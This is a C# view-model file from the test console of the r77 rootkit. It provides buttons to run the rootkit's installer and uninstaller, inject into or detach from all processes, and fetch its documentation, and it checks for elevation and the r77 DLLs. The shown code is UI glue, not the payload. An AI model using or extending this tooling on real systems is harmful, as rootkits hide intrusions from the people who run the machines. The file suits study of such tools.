using BytecodeApi;
using BytecodeApi.IO;
using BytecodeApi.Rest;
using BytecodeApi.Wpf;
using Global;
using System.Diagnostics;
using TestConsole.Helper;
using TestConsole.Model;

namespace TestConsole;

public sealed class MainWindowViewModel : ViewModel
{
	public static MainWindowViewModel? Singleton { get; private set; }
	public MainWindow View { get; set; }

	private DelegateCommand<string>? _RunCommand;
	private DelegateCommand? _InjectAllCommand;
	private DelegateCommand? _DetachAllCommand;
	private DelegateCommand? _DocumentationCommand;
	private DelegateCommand? _AboutCommand;
	public DelegateCommand<string> RunCommand => _RunCommand ??= new(RunCommand_Execute!);
	public DelegateCommand InjectAllCommand => _InjectAllCommand ??= new(InjectAllCommand_Execute);
	public DelegateCommand DetachAllCommand => _DetachAllCommand ??= new(DetachAllCommand_Execute);
	public DelegateCommand DocumentationCommand => _DocumentationCommand ??= new(DocumentationCommand_Execute);
	public DelegateCommand AboutCommand => _AboutCommand ??= new(AboutCommand_Execute);

	public MainWindowViewModel(MainWindow view)
	{
		Singleton = this;
		View = view;
	}

	private void RunCommand_Execute(string file)
	{
		string fileName = file switch
		{
			"Example" => $"{R77Const.HidePrefix}-Example.exe",
			"Install" => "Install.exe",
			"Uninstall" => "Uninstall.exe",
			_ => throw new ArgumentException(),
		};

		if (ApplicationDirectory.GetFilePath(fileName) is string path)
		{
			try
			{
				Process.Start(new ProcessStartInfo(path) { UseShellExecute = true });

				Log.Information(
					new LogTextItem("File"),
					new LogFileItem(fileName),
					new LogTextItem("was executed.")
				);
			}
			catch (Exception ex)
			{
				Log.Error(
					new LogTextItem("Executing"),
					new LogFileItem(fileName),
					new LogTextItem("failed."),
					new LogDetailsItem($"Error Details: {ex.Message}")
				);
			}
		}
	}
	private async void InjectAllCommand_Execute()
	{
		await ProcessList.InjectAll();
	}
	private async void DetachAllCommand_Execute()
	{
		await ProcessList.DetachAll();
	}
	private async void DocumentationCommand_Execute()
	{
		try
		{
			byte[] pdf = await Async(GenericRestClient.Instance.Get("https://docs.bytecode77.com/r77-rootkit/Technical%20Documentation.pdf").ReadByteArray());
			TempDirectory.ExecuteFile("Technical Documentation.pdf", pdf);
		}
		catch (Exception ex)
		{
			Log.Error(
				new LogTextItem("Error downloading"),
				new LogFileItem("Technical Documentation.pdf"),
				new LogTextItem("Please visit"),
				new LogLinkItem("https://bytecode77.com/r77-rootkit", () => Process.Start(new ProcessStartInfo("https://bytecode77.com/r77-rootkit") { UseShellExecute = true })),
				new LogDetailsItem($"Error Details: {ex.Message}")
			);
		}
	}
	private void AboutCommand_Execute()
	{
		new AboutDialog(View).ShowDialog();
	}

	public void WriteInitialLogEntries()
	{
		if (!ApplicationBase.Process.IsElevated)
		{
			Log.Warning(
				[
					new LogTextItem("To inject or detach elevated processes,"),
					new LogLinkItem("run as administrator", ElevateCommand.Execute)
				],
				true
			);
		}

		if (Environment.Is64BitOperatingSystem && nint.Size == 4)
		{
			Log.Warning([new LogTextItem("Use the 64-bit version of the Test Console.")], true);
		}

		if (!ApplicationDirectory.FilesExist([nint.Size == 4 ? "Helper32.dll" : "Helper64.dll", "r77-x86.dll", "r77-x64.dll", "Install.exe", "Uninstall.exe"], out string[] notFoundFileNames))
		{
			Log.Error(
				[
					new LogTextItem("File not found:"),
					..notFoundFileNames.SelectMany(fileName => new LogItem[] { new LogFileItem(fileName) { NoSpacing = true }, new LogTextItem(",") }).SkipLast(1)
				],
				true
			);
		}
	}
}